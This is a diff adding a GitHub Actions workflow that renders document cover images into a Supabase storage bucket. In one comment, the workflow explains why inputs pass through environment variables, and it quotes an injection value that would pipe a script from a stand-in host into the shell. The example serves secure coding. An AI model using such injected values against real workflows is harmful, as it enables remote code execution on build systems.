@@ -1,0 +1,83 @@
+name: Document covers
+
+# Renders page 1 of each new document into the public "covers" bucket so the
+# library cards show the real cover page instead of the generated placeholder.
+#
+# COST: this repository is public, so GitHub Actions minutes are unlimited and
+# free. Supabase usage is a few hundred KB of storage per document. Nothing
+# here needs a paid plan on either side.
+
+on:
+  # Run it yourself right after uploading documents:
+  # Actions -> Document covers -> Run workflow.
+  workflow_dispatch:
+    inputs:
+      force:
+        description: "Re-render covers that already exist"
+        type: boolean
+        default: false
+      only:
+        description: "Optional: only documents whose title/path contains this text"
+        type: string
+        required: false
+
+  # Safety net so a document uploaded straight into the Supabase dashboard
+  # still gets a cover without anyone remembering to press a button.
+  # Note: GitHub pauses cron on repositories with no activity for 60 days.
+  schedule:
+    - cron: "17 * * * *" # hourly, at :17 past (off-peak minutes queue faster)
+
+# Two runs at once would race on the same rows. Let the newer one wait.
+concurrency:
+  group: document-covers
+  cancel-in-progress: false
+
+jobs:
+  covers:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20" # the script uses built-in fetch; no npm install
+
+      # poppler-utils -> pdftoppm (PDF page to JPEG)
+      # libreoffice-writer/impress -> soffice (docx/pptx to PDF)
+      # The runner image already ships some of these; check before installing
+      # so the usual run skips a slow apt step entirely.
+      - name: Install renderers
+        run: |
+          need=""
+          command -v pdftoppm >/dev/null || need="$need poppler-utils"
+          command -v soffice  >/dev/null || need="$need libreoffice-writer libreoffice-impress"
+          if [ -n "$need" ]; then
+            echo "Installing:$need"
+            sudo apt-get update -qq
+            sudo apt-get install -y -qq $need
+          else
+            echo "pdftoppm and soffice already present."
+          fi
+          pdftoppm -v 2>&1 | head -1
+          soffice --version | head -1
+
+      - name: Generate covers
+        env:
+          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+          # Passed through the environment rather than interpolated into the
+          # run: script. A `${{ }}` expression is pasted in as raw text before
+          # the shell ever sees it, so a value like `x'; curl evil.sh | sh; '`
+          # would execute. Via env it is only ever data.
+          FORCE: ${{ inputs.force }}
+          ONLY: ${{ inputs.only }}
+        run: |
+          set -euo pipefail
+          args=()
+          # `if` rather than `[ x ] && ...` — a false test returns non-zero,
+          # which under `set -e` would abort the step instead of skipping.
+          if [ "${FORCE:-false}" = "true" ]; then args+=(--force); fi
+          if [ -n "${ONLY:-}" ]; then args+=(--only "$ONLY"); fi
+          node tools/generate-covers.mjs "${args[@]}"
